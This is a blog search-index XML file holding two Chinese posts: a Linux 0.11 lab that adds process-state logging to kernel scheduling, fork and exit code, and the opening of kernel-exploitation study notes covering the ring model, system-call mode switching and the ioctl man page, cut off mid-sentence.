<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>HIT-OSlab3</title>
      <link href="2021/08/22/HIT-OSlab3/"/>
      <url>2021/08/22/HIT-OSlab3/</url>
      
        <content type="html"><![CDATA[<p>在借助linux0.11内核代码剖析，别人的实验代码，以及操作系统原理实现与实践下完成QAQ</p><h2 id="process-c"><a href="#process-c" class="headerlink" title="process.c"></a>process.c</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/times.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HZ100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CHILD_PROCESS_NUM   10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> c_pr[CHILD_PROCESS_NUM];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHILD_PROCESS_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        c_pr[i] = fork();</span><br><span class="line">        <span class="keyword">if</span>(c_pr[i] == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// child process</span></span><br><span class="line">            cpuio_bound(<span class="number">20</span>, <span class="number">2</span> * i, <span class="number">20</span> - <span class="number">2</span> * i);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;   <span class="comment">// 执行完cpuio_bound 结束子进程</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(c_pr[i] &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Child process %d failed to fork!\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; CHILD_PROCESS_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Child Process ID:%d\n&quot;</span>, c_pr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    wait();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 此函数按照参数占用CPU和I/O时间</span></span><br><span class="line"><span class="comment"> * last: 函数实际占用CPU和I/O的总时间，不含在就绪队列中的时间，&gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * cpu_time: 一次连续占用CPU的时间，&gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * io_time: 一次I/O消耗的时间，&gt;=0是必须的</span></span><br><span class="line"><span class="comment"> * 如果last &gt; cpu_time + io_time，则往复多次占用CPU和I/O</span></span><br><span class="line"><span class="comment"> * 所有时间的单位为秒</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cpuio_bound</span><span class="params">(<span class="keyword">int</span> last, <span class="keyword">int</span> cpu_time, <span class="keyword">int</span> io_time)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tms</span> <span class="title">start_time</span>, <span class="title">current_time</span>;</span></span><br><span class="line"><span class="keyword">clock_t</span> utime, stime;</span><br><span class="line"><span class="keyword">int</span> sleep_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (last &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">/* CPU Burst */</span></span><br><span class="line">times(&amp;start_time);</span><br><span class="line"><span class="comment">/* 其实只有t.tms_utime才是真正的CPU时间。但我们是在模拟一个</span></span><br><span class="line"><span class="comment"> * 只在用户状态运行的CPU大户，就像“for(;;);”。所以把t.tms_stime</span></span><br><span class="line"><span class="comment"> * 加上很合理。*/</span></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">times(&amp;current_time);</span><br><span class="line">utime = current_time.tms_utime - start_time.tms_utime;</span><br><span class="line">stime = current_time.tms_stime - start_time.tms_stime;</span><br><span class="line">&#125; <span class="keyword">while</span> ( ( (utime + stime) / HZ )  &lt; cpu_time );</span><br><span class="line">last -= cpu_time;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last &lt;= <span class="number">0</span> )</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* IO Burst */</span></span><br><span class="line"><span class="comment">/* 用sleep(1)模拟1秒钟的I/O操作 */</span></span><br><span class="line">sleep_time=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (sleep_time &lt; io_time)</span><br><span class="line">&#123;</span><br><span class="line">sleep(<span class="number">1</span>);</span><br><span class="line">sleep_time++;</span><br><span class="line">&#125;</span><br><span class="line">last -= sleep_time;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="main-c"><a href="#main-c" class="headerlink" title="main.c"></a>main.c</h2><p>内核状态下只能用printk，根据老师的代码增加fprintk函数，在github上有相关的resource，遂不再记录<br>因为要早早的开始记录日志文件，所以在进程0开始在用户态执行以后就打开日志文件，开启了多进程视图，这个时间点就在move_to_user_mode()之后，但是还要先挂载上文件系统才能记录。<br>关键代码如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">setup((<span class="keyword">void</span> *) &amp;drive_info);</span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/dev/tty0&quot;</span>,O_RDWR,<span class="number">0</span>);    <span class="comment">// 完成了文件系统加载</span></span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);        </span><br><span class="line">(<span class="keyword">void</span>) dup(<span class="number">0</span>);        </span><br><span class="line">(<span class="keyword">void</span>) open(<span class="string">&quot;/var/process.log&quot;</span>,O_CREAT|O_TRUNC|O_WRONLY,<span class="number">0666</span>);</span><br></pre></td></tr></table></figure></p><h2 id="fork-c"><a href="#fork-c" class="headerlink" title="fork.c"></a>fork.c</h2><p>完成多进程日志记录最重要的就是找到内核中关于进程状态代码的切换点，然后添加相关代码完成记录。<br>fork首先是新建进程的地方，这个地方肯定要记录，真正实现进程创建的函数是copy_process()函数，完成pcb相关设置后将进程状态设置为就绪，即p-&gt;state = TASK_RUNNING，这里就要向日志文件写相关记录，分别是新建和记录（其实不难发现，所有应该添加的代码，都应该围绕p-&gt;state这种状态设置代码来完成）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%ld\t%c\t%ld\n&quot;</span>, p-&gt;pid, <span class="string">&#x27;N&#x27;</span>, jiffies);</span><br><span class="line">p-&gt;state = TASK_RUNNING;<span class="comment">/* do this last, just in case */</span></span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%ld\t%c\t%ld\n&quot;</span>, p-&gt;pid, <span class="string">&#x27;J&#x27;</span>, jiffies);</span><br></pre></td></tr></table></figure><h2 id="sched-c"><a href="#sched-c" class="headerlink" title="sched.c"></a>sched.c</h2><p>sched.c是内核中有有关进程调度管理的程序，其中包括有关调度的基本函数sleep_on()，wakeup()，schedule()等。<br>要做出修改的函数有schedule(),sys_pause(),sleep_on(),interruptible_sleep_on(),wake_up()函数<br>为了方便直接贴出所有代码（懒）<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">schedule</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,next,c;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;</span><br><span class="line">(*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));</span><br><span class="line">(*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">(*p)-&gt;state==TASK_INTERRUPTIBLE)</span><br><span class="line">&#123;</span><br><span class="line">(*p)-&gt;state=TASK_RUNNING;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">c = <span class="number">-1</span>;</span><br><span class="line">next = <span class="number">0</span>;</span><br><span class="line">i = NR_TASKS;</span><br><span class="line">p = &amp;task[NR_TASKS];</span><br><span class="line"><span class="keyword">while</span> (--i) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*--p)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">c = (*p)-&gt;counter, next = i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line"><span class="keyword">if</span> (*p)</span><br><span class="line">(*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">(*p)-&gt;priority;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;pid != task[next]-&gt;pid)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;state == TASK_RUNNING)</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tR\t%d\n&quot;</span>, task[next]-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">switch_to(next);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_pause</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line"><span class="keyword">if</span>(current-&gt;pid != <span class="number">0</span>)</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp = *p;</span><br><span class="line">*p = current;</span><br><span class="line">current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, tmp-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">interruptible_sleep_on</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">tmp=*p;</span><br><span class="line">*p=current;</span><br><span class="line">repeat:current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line">&#125;</span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (tmp)</span><br><span class="line">&#123;</span><br><span class="line">tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, tmp-&gt;pid, jiffies);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wake_up</span><span class="params">(struct task_struct **p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (p &amp;&amp; *p) &#123;</span><br><span class="line">(**p).state=<span class="number">0</span>;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tJ\t%d\n&quot;</span>, (*p)-&gt;pid, jiffies);</span><br><span class="line">*p=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="exit-c"><a href="#exit-c" class="headerlink" title="exit.c"></a>exit.c</h2><p>修改do_exit和sys_waitpid<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_exit</span><span class="params">(<span class="keyword">long</span> code)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">1</span>]),get_limit(<span class="number">0x0f</span>));</span><br><span class="line">free_page_tables(get_base(current-&gt;ldt[<span class="number">2</span>]),get_limit(<span class="number">0x17</span>));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_TASKS ; i++)</span><br><span class="line"><span class="keyword">if</span> (task[i] &amp;&amp; task[i]-&gt;father == current-&gt;pid) &#123;</span><br><span class="line">task[i]-&gt;father = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (task[i]-&gt;state == TASK_ZOMBIE)</span><br><span class="line"><span class="comment">/* assumption task[1] is always init */</span></span><br><span class="line">(<span class="keyword">void</span>) send_sig(SIGCHLD, task[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span> ; i&lt;NR_OPEN ; i++)</span><br><span class="line"><span class="keyword">if</span> (current-&gt;filp[i])</span><br><span class="line">sys_close(i);</span><br><span class="line">iput(current-&gt;pwd);</span><br><span class="line">current-&gt;pwd=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;root);</span><br><span class="line">current-&gt;root=<span class="literal">NULL</span>;</span><br><span class="line">iput(current-&gt;executable);</span><br><span class="line">current-&gt;executable=<span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader &amp;&amp; current-&gt;tty &gt;= <span class="number">0</span>)</span><br><span class="line">tty_table[current-&gt;tty].pgrp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (last_task_used_math == current)</span><br><span class="line">last_task_used_math = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (current-&gt;leader)</span><br><span class="line">kill_session();</span><br><span class="line">current-&gt;state = TASK_ZOMBIE;</span><br><span class="line">current-&gt;exit_code = code;</span><br><span class="line">tell_father(current-&gt;father);</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tE\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">return</span> (<span class="number">-1</span>);<span class="comment">/* just to suppress warnings */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sys_waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid,<span class="keyword">unsigned</span> <span class="keyword">long</span> * stat_addr, <span class="keyword">int</span> options)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag, code;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">verify_area(stat_addr,<span class="number">4</span>);</span><br><span class="line">repeat:</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p) &#123;</span><br><span class="line"><span class="keyword">if</span> (!*p || *p == current)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;father != current-&gt;pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span> (pid&gt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pid != pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != current-&gt;pgrp)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid != <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> ((*p)-&gt;pgrp != -pid)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span> ((*p)-&gt;state) &#123;</span><br><span class="line"><span class="keyword">case</span> TASK_STOPPED:</span><br><span class="line"><span class="keyword">if</span> (!(options &amp; WUNTRACED))</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">put_fs_long(<span class="number">0x7f</span>,stat_addr);</span><br><span class="line"><span class="keyword">return</span> (*p)-&gt;pid;</span><br><span class="line"><span class="keyword">case</span> TASK_ZOMBIE:</span><br><span class="line">current-&gt;cutime += (*p)-&gt;utime;</span><br><span class="line">current-&gt;cstime += (*p)-&gt;stime;</span><br><span class="line">flag = (*p)-&gt;pid;</span><br><span class="line">code = (*p)-&gt;exit_code;</span><br><span class="line">release(*p);</span><br><span class="line">put_fs_long(code,stat_addr);</span><br><span class="line"><span class="keyword">return</span> flag;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (flag) &#123;</span><br><span class="line"><span class="keyword">if</span> (options &amp; WNOHANG)</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">current-&gt;state=TASK_INTERRUPTIBLE;</span><br><span class="line">fprintk(<span class="number">3</span>, <span class="string">&quot;%d\tW\t%d\n&quot;</span>, current-&gt;pid, jiffies);</span><br><span class="line">schedule();</span><br><span class="line"><span class="keyword">if</span> (!(current-&gt;signal &amp;= ~(<span class="number">1</span>&lt;&lt;(SIGCHLD<span class="number">-1</span>))))</span><br><span class="line"><span class="keyword">goto</span> repeat;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> -EINTR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> -ECHILD;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>太难了太难了，内核太难了……</p>]]></content>
      
      
      
        <tags>
            
            <tag> os </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kernel-pwn基础知识学习</title>
      <link href="2021/08/10/kernal-pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
      <url>2021/08/10/kernal-pwn%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<p>原文：<a href="https://www.anquanke.com/post/id/201043">https://www.anquanke.com/post/id/201043</a></p><p>照着原文手打了一遍，印象加深get</p><h2 id="02-kernel简介"><a href="#02-kernel简介" class="headerlink" title="02. kernel简介"></a>02. kernel简介</h2><h3 id="什么是kernel"><a href="#什么是kernel" class="headerlink" title="什么是kernel"></a>什么是kernel</h3><p>kernel也是一个程序，用来管理软件发出的数据的IO要求，将这些要求转义为指令，交给CPU和计算机的其他组件处理，kernel是现代操作系统最基本的部分。</p><p><img src="https://img.lhyerror404.cn/error404/2020-03-13-Kernel_Layout.svg" alt=""></p><p>kernel最主要的功能有两点：</p><ol><li>控制并与硬件进行交互</li><li>提供application能运行的环境</li></ol><p>包括IO，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，kernel的crash通常会引起重启。</p><h3 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h3><p>intel CPU将CPU的特权级别分为4个级别：Ring 0，Ring 1，Ring 2，Ring 3.</p><p>Ring 0只给OS使用，Ring 3所有程序都可以使用，内层Ring 可以随便使用外层Ring的资源。</p><p>使用Ring Model是为了提升系统安全性，例如某个间谍软件作为一个在Ring 3运行的用户程序，在不通知用户的时候打开摄像头会被组成，因为访问硬件需要使用being驱动程序保留的Ring 1的方法。</p><p>大多数的现代操作系统只使用了Ring 0和Ring 3.</p><h3 id="model-change"><a href="#model-change" class="headerlink" title="model change"></a>model change</h3><h4 id="user-space-to-kernel-space"><a href="#user-space-to-kernel-space" class="headerlink" title="user space to kernel space"></a>user space to kernel space</h4><p>当发生系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换时，具体过程为：</p><ol><li><p>通过<code>swapgs</code>切换GS段寄存器，将GS寄存器的值和一个特定位置的值进行交换，目的是保存GS值，同时将该位置的值作为内核执行时的GS值使用。</p></li><li><p>将当前栈顶（用户空间栈顶）记录在CPU独占变量区域里，将CPU独占区域里记录的内核放入RSP/ESP</p></li><li><p>通过push保存各寄存器值，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 *&#x2F;</span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line">&#x2F;* 保存栈值，并设置内核栈 *&#x2F;</span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line">&#x2F;* 通过push保存寄存器值，形成一个pt_regs结构 *&#x2F;</span><br><span class="line">&#x2F;* Construct struct pt_regs on stack *&#x2F;</span><br><span class="line">pushq  $__USER_DS                &#x2F;* pt_regs-&gt;ss *&#x2F;</span><br><span class="line">pushq  PER_CPU_VAR(rsp_scratch)  &#x2F;* pt_regs-&gt;sp *&#x2F;</span><br><span class="line">pushq  %r11                      &#x2F;* pt_regs-&gt;flags *&#x2F;</span><br><span class="line">pushq  $__USER_CS                &#x2F;* pt_regs-&gt;cs *&#x2F;</span><br><span class="line">pushq  %rcx                      &#x2F;* pt_regs-&gt;ip *&#x2F;</span><br><span class="line">pushq  %rax                      &#x2F;* pt_regs-&gt;orig_ax *&#x2F;</span><br><span class="line">pushq  %rdi                      &#x2F;* pt_regs-&gt;di *&#x2F;</span><br><span class="line">pushq  %rsi                      &#x2F;* pt_regs-&gt;si *&#x2F;</span><br><span class="line">pushq  %rdx                      &#x2F;* pt_regs-&gt;dx *&#x2F;</span><br><span class="line">pushq  %rcx tuichu               &#x2F;* pt_regs-&gt;cx *&#x2F;</span><br><span class="line">pushq  $-ENOSYS                  &#x2F;* pt_regs-&gt;ax *&#x2F;</span><br><span class="line">pushq  %r8                       &#x2F;* pt_regs-&gt;r8 *&#x2F;</span><br><span class="line">pushq  %r9                       &#x2F;* pt_regs-&gt;r9 *&#x2F;</span><br><span class="line">pushq  %r10                      &#x2F;* pt_regs-&gt;r10 *&#x2F;</span><br><span class="line">pushq  %r11                      &#x2F;* pt_regs-&gt;r11 *&#x2F;</span><br><span class="line">sub $(6*8), %rsp                 &#x2F;* pt_regs-&gt;bp, bx, r12-15 not saved *&#x2F;</span><br></pre></td></tr></table></figure></li><li><p>通过汇编指令判断是否为 <code>x32_abi</code>。</p></li><li><p>通过系统调用号，跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</p></li></ol><h4 id="kernel-space-to-user-space"><a href="#kernel-space-to-user-space" class="headerlink" title="kernel space to user space"></a>kernel space to user space</h4><p>退出时，流程如下：</p><ol><li>通过swapgs恢复GS值</li><li>通过sysretq或者iretq恢复到用户控件继续执行。如果使用iretq还需要给出用户空间的一些信息（cs，eflags/rflags，esp/rsp等）</li></ol><h4 id="关于syscall"><a href="#关于syscall" class="headerlink" title="关于syscall"></a>关于syscall</h4><p>系统调用，指的是用户控件的程序向操作系统内核请求需要更高权限的服务，比如IO操作或者进程间通信。系统调用提供用户程序与操作系统之间的接口，部分库函数（如scanf，puts等IO相关的函数实际上是对系统调用的封装（read和write））</p><blockquote><p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p></blockquote><h4 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h4><p>在man手册中，关于这个函数的说明如下：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">NAME</span><br><span class="line">       ioctl - control device</span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line">       <span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       <span class="function">The <span class="title">ioctl</span><span class="params">()</span> system call manipulates the underlying device parameters of special</span></span><br><span class="line">       files.  In particular, many  operating  characteristics  of  character  special</span><br><span class="line">       files  (e.g., terminals) <span class="function">may be controlled with <span class="title">ioctl</span><span class="params">()</span> requests.  The argument</span></span><br><span class="line"><span class="function">       fd must be an open file descriptor.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line">       The second argument is a device-dependent request code.  The third argument  is</span><br><span class="line">       an  untyped  pointer  to  memory.  It<span class="number">&#x27;</span><span class="function">s traditionally <span class="keyword">char</span> *<span class="title">argp</span> <span class="params">(from the days</span></span></span><br><span class="line">       before void * was valid C), and will be so named for this discussion.</span><br><span class="line"></span><br><span class="line">       <span class="function">An <span class="title">ioctl</span><span class="params">()</span> request has encoded in it whether the argument is an in parameter <span class="keyword">or</span></span></span><br><span class="line">       out  parameter, and the size of the argument argp in bytes.  Macros and defines</span><br><span class="line">       used in specifying an ioctl() request are located in the file 